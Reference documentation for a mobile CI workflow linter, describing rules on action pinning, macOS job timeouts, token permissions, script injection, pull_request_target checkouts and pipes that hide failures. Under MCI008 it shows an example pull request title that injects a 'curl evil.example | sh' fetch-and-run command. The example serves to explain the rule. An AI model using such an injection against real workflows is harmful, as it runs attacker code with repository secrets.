# Lint rules

What each rule finds, why it matters for a mobile app, and how to fix it.

## Overview

`mobileci lint` (``WorkflowLinter``) reads each workflow as YAML, keeps the line of every key
and value, and runs the rules below. A finding has a severity — `error`, `warning` or `note` —
and `--fail-on` decides which severities fail the command.

Silence a rule where it does not apply, with a reason next to it:

```yaml
- uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
  # mobileci-ignore MCI012: the release job pushes the version tag with this token
```

A `# mobileci-ignore MCI012` comment covers its own line and the next one; a
`# mobileci-ignore-file MCI012` comment covers the file. Rules are named by identifier or by
name, separated by commas; a comment that names no known rule silences nothing. To skip a
rule everywhere, pass `--disable MCI012`.

MobileCI checks the mobile and security concerns below. It does not check workflow syntax and
expression types; run [actionlint](https://github.com/rhysd/actionlint) next to it for that.

### MCI000 invalid-workflow (error)

The file is not UTF-8, is larger than 1 MiB, is not valid YAML, nests more than 64 levels,
expands to more than 200,000 nodes through aliases, or has no `jobs:` mapping. The message
gives the position only; it never quotes the file.

### MCI001 unpinned-action (warning)

`uses: actions/checkout@v4` follows whatever the tag points to today. A tag can be moved, and
a compromised action then runs in every workflow that uses it — with access to signing
certificates and App Store Connect keys in release jobs. Pin the full commit SHA and keep the
tag in a comment: `uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1`.
Docker actions need an `@sha256:` digest. Local actions (`./…`) are not checked.

### MCI002 macos-job-without-timeout (warning)

A job without `timeout-minutes` runs for up to 6 hours. On macOS, a simulator that never
boots or a UI test waiting for an alert burns those hours at the macOS rate. Set a timeout
that is generous for a normal run, typically 30–60 minutes.

### MCI003 macos-workflow-without-concurrency (warning)

Without a `concurrency` group, pushing three commits to a pull request runs three full macOS
builds. Add a group per workflow and ref, and cancel superseded runs on pull requests.

### MCI004 floating-macos-image (warning)

`macos-latest` moves to a new macOS image when GitHub decides; the default Xcode, the
simulators and Ruby move with it, and a build breaks without a change in the repository. Use a
versioned label (`macos-26`, `macos-26-xlarge`) and update it on purpose. Labels inside a
`matrix` are resolved.

### MCI005 xcode-not-selected (warning)

A macOS job runs `xcodebuild`, `xcrun`, `swift build`, `pod install` or `fastlane` without
choosing an Xcode. Every image ships several; the default changes with image updates. Set
`DEVELOPER_DIR: /Applications/Xcode_26.6.app/Contents/Developer` in the job's `env`, run
`sudo xcode-select -s`, or use a setup-xcode action.

### MCI006 default-token-permissions (warning)

Without a `permissions` block, `GITHUB_TOKEN` gets the repository's default, which is
read-write on older repositories and organizations. Declare `permissions: contents: read` at
the top and widen it per job.

### MCI007 write-all-permissions (error)

`permissions: write-all` gives every step write access to code, releases, packages and
settings that the job almost certainly does not need.

### MCI008 untrusted-input-in-script (error)

```yaml
- run: echo "${{ github.event.pull_request.title }}"
```

GitHub pastes the title into the script before bash reads it. A pull request titled
`"; curl evil.example | sh; "` runs that command. The rule knows the properties an outside
contributor controls — titles, bodies, comments, branch names, commit messages and author
names, after `github.event`, `github.head_ref` and objects that contain them, such as
`toJSON(github.event)` — in `run:` scripts and in `actions/github-script`. It also follows
`${{ env.NAME }}`: when the step, job or workflow `env:` that GitHub uses for `NAME` sets it from
one of those properties, the expansion is reported, because it is pasted into the script the
same way. A step value that reads `env` again, such as `B: ${{ env.A }}`, is followed into the
job and workflow `env:` that GitHub evaluates it against. Pass the value through `env:` and
quote the variable:

```yaml
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "$TITLE"
```

### MCI009 pull-request-target-checkout (error)

`pull_request_target` runs in the context of the base repository, with its secrets and a
write token. Checking out the pull request's head there (`ref: ${{ github.event.pull_request.head.sha }}`,
`refs/pull/…`) and building it runs a stranger's code with those secrets. Build contributed
code with `pull_request`.

### MCI010 continue-on-error (warning)

`continue-on-error: true` on a job or step turns a failing test run green. Values written as
expressions (`${{ matrix.experimental }}`) are not reported.

### MCI011 secret-in-script (warning)

`${{ secrets.MATCH_PASSWORD }}` inside a `run:` script becomes part of the script's text: it
is visible to anything that can read the generated script file and is interpreted by the
shell. Map it to an environment variable of the step instead.

### MCI012 checkout-persists-credentials (note)

`actions/checkout` stores `GITHUB_TOKEN` in `.git/config` unless told not to; every later
step, including third-party actions and build scripts from dependencies, can read it. Add
`persist-credentials: false` unless a later step pushes.

### MCI013 flutter-version-not-pinned (warning)

`subosito/flutter-action` without `flutter-version` or `flutter-version-file` installs the
newest release of the channel each time. Pin the version, or point `flutter-version-file` at
`pubspec.yaml` (with an exact `environment: flutter:`) or `.fvmrc`.

### MCI014 node-version-not-pinned (warning)

`actions/setup-node` without `node-version` or `node-version-file` keeps the Node.js of the
runner image, which changes with the image. React Native and Expo CLIs check the Node.js
version. Use `node-version-file: .nvmrc`.

### MCI015 pipe-hides-build-failure (error)

```yaml
- run: xcodebuild test -scheme App | xcbeautify
```

Without `shell: bash`, GitHub runs scripts with `bash -e`, where a pipeline's exit status is
that of its last command: the formatter succeeds, so failing tests leave the step green. The
rule looks for `xcodebuild`, `fastlane`, `gradle`/`gradlew`, `flutter` and `swift` piped into
another command, with or without spaces around the `|` (continuation lines are joined; `||` is
not a pipe). Add `set -o pipefail` at
the top of the script, or set `shell: bash` on the step, the job or the workflow's
`defaults.run`, which makes GitHub add `-o pipefail`.

## Topics

- ``RuleID``
- ``WorkflowLinter``
